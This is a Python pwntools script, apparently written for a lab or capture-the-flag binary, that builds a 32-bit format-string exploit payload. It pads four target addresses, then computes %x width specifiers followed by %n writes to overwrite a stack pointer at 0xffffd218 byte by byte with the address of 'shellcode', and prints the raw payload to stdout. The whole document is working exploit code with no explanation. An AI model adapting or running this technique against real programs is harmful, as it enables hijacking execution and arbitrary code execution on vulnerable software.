from pwn import *
import sys

print = lambda *args, **kwargs: None # override print function

address_of_ptr = 0xffffd218
address_of_shellcode = 0x804930f

payload = p32(address_of_ptr)
payload += b'JUNK' 
payload += p32(address_of_ptr+1)
payload += b'JUNK' 
payload += p32(address_of_ptr+2)
payload += b'JUNK' 
payload += p32(address_of_ptr+3)

printed_chars = len(payload)
byte_to_insert = address_of_shellcode & 0xff
print(byte_to_insert)
res = byte_to_insert - printed_chars

print("res is:",res)
if res <= 4:
    while res <= 4:
        res += 0x100
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res
else:
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res 


byte_to_insert = (address_of_shellcode & (0xff << 8) ) >> 8
print(byte_to_insert)
res = byte_to_insert - printed_chars
print("res is:",res)
if res <= 4:
    while res <= 4:
        res += 0x100
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res
else:
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res


byte_to_insert = (address_of_shellcode & (0xff << 16) ) >> 16
print(byte_to_insert)
res = byte_to_insert - printed_chars
print("res is:",res)
if res <= 4:
    while res <= 4:
        res += 0x100
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res
else:
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res


byte_to_insert = (address_of_shellcode & (0xff << 24) ) >> 24
print(byte_to_insert)
res = byte_to_insert - printed_chars 
print("res is:",res)
if res <= 4:
    while res <= 4:
        res += 0x100
    # payload += b'%' + str(res+4).encode()+ b'x'  + b'%n'
    payload += b'%' + str(res).encode()+ b'x' + b'%n'
    printed_chars += res

else:
    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
    printed_chars += res


sys.stdout.buffer.write(payload)
